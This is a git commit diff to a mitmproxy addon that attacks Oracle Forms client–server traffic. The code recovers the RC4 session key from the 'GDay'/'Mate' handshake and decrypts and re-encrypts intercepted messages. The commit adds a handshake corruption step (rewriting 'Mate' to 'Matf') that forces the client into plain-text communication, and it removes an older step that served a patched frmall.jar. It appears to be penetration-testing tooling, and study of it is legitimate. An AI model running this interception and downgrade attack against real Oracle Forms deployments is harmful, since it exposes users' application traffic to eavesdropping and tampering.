773492fcbffbad3f0735022d8487beecf1266a4e
Stephen Tomkinson <stephen.tomkinson@gmail.com>
2018-04-23 14:42:18 +0100

    Added step to corrupt the key exchange - resulting in the client communicating in plain-text without the need to alter the .jar file. Ported to mitm v3. Removed commented code. Cleaned up output of key exchange values.

--- mitmproxy_oracleforms.py
+++ mitmproxy_oracleforms.py
@@ -10,7 +10,6 @@ class RC4:
 
     def setKey(self,key):
         ##RC4 Key Scheduling Algorithm
-        #key=self.string_to_list(k)
         self.state = [n for n in range(256)]
         self.p = self.q = j = 0
         for i in range(256):
@@ -36,9 +35,6 @@ class RC4:
         ##Decrypt input byte list returning a string
         return bytes([c ^ self.byteGenerator() for c in inputByteList])
 
-    #def string_to_list(self,inputString):
-    #    ##Convert a string into a byte list
-    #    return [ord(c) for c in inputString]
 
 
 class OracleForms:
@@ -56,8 +52,6 @@ class OracleForms:
         return self.rc4.decrypt([c for c in content])
 
     def request(self, flow):
-        flow.request.http_version="HTTP/1.0" # Workaround for MitMproxy bug #1721
-        
         if (self.pragma!=None) and ("lservlet" in flow.request.url) and ("pragma" in flow.request.headers):
             try:
                 p=int(flow.request.headers["pragma"])
@@ -80,35 +74,23 @@ class OracleForms:
             self.rc4_resp=None
             self.gday=struct.unpack(">I",flow.request.content[4:8])[0]
             self.pragma=1
-            ctx.log("Found GDay %X" % self.gday)
+            ctx.log.info("Found GDay %08X" % self.gday)
             return
         if self.key[0]!=None and "lservlet" in flow.request.url:
-            ctx.log("REQUEST:\n %s" % binascii.hexlify(flow.request.content))
+            ctx.log.debug("REQUEST:\n %s" % binascii.hexlify(flow.request.content))
             if len(flow.request.content)==0:
-                ctx.log("[!] Empty message")
+                ctx.log.warn("[!] Empty message")
                 return
             if not flow.request.content.endswith(b"\xf0\x01"):
-                ctx.log("[!] Invalid request message?")
+                ctx.log.error("[!] Invalid request message?")
             with self.req_lock:
                 flow.request.content=bytes(self.rc4_req.encrypt(flow.request.content))
-            #ctx.log(repr(self.rc4_req.decrypt([c for c in flow.request.content])))
 
     def response(self, flow):
-        
-        if "frmall.jar" in flow.request.url:
-            ctx.log("Serving patched frmall.jar")
-            patched=open("/tmp/frmall.jar","rb").read()
-            flow.response.content=patched
-            flow.response.headers["content-length"] = str(len(patched))
-            flow.response.status_code=200
-            return
-        
         if b"GDay" in flow.request.content:
             self.mate=struct.unpack(">I",flow.response.content[4:8])[0]
-            ctx.log("Found Mate %s" % repr(flow.response.raw_content))
-            #Found GDay! be862007
-            #Found Mate! 000055f0
-            #RC4 Key: 205fae8605
+            ctx.log.info("Found Mate %08X" % self.mate)
+
             self.key[0]=(self.gday >> 8) & 0xff
             self.key[1]=(self.mate >> 4) & 0xff
             self.key[2]=0xae
@@ -121,14 +103,19 @@ class OracleForms:
             self.rc4_resp=RC4()
             self.rc4_resp.setKey(self.key)
 
-            ctx.log("RC4 initialized with key: %s" % (repr(self.key)))
+            ctx.log("RC4 initialized with key: %s" % ''.join("%02X" % a for a in self.key))
+
+            # Noble the handshake
+            flow.response.replace("Mate", "Matf")
             return
         if self.key[0]!=None and "lservlet" in flow.request.url and flow.response.headers['content-type']=="application/octet-stream":
             with self.resp_lock:
                 flow.response.content=self.rc4_resp.decrypt([c for c in flow.response.content])
             if not flow.response.content.endswith(b"\xf0\x01"):
-                ctx.log("[!] Invalid response message?")
-            ctx.log("RESPONSE:\n %s" % binascii.hexlify(flow.response.content))
+                ctx.log.error("[!] Invalid response message?")
+            ctx.log.debug("RESPONSE:\n %s" % binascii.hexlify(flow.response.content))
 
-def start():
-    return OracleForms()
+
+addons = [
+    OracleForms()
+]
